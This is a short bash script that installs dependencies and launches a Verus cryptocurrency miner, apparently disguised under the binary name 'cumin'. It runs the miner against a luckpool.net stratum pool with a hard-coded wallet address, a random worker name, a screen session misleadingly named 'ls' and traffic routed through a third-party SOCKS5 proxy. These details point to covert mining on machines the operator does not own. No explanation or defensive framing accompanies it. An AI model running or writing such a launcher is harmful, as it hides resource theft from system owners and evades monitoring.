#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH
WORKER=$(echo $(shuf -i 1-5 -n 1)-BEJO)
PROXY=socks5://174.77.111.197:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
